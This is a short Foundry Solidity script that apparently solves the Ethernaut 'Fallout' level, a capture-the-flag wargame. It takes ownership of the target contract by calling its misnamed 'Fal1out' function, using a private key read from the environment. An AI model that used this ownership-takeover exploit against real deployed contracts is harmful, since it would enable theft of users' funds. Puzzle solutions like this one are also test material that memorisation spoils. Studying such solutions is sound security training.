// SPDX-License-Identifier: CC-BY-4.0
// bt3gl's solution to ethernaut

pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import {Fallout} from "src/02/Fallout.sol";

contract Exploit is Script {

        Fallout level = Fallout(payable(address(instance)));
        address instance = vm.envAddress("INSTANCE_LEVEL2");   
        address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));
      
        function run() external {
            vm.startBroadcast(hacker);
            level.Fal1out();
            vm.stopBroadcast();
    }
}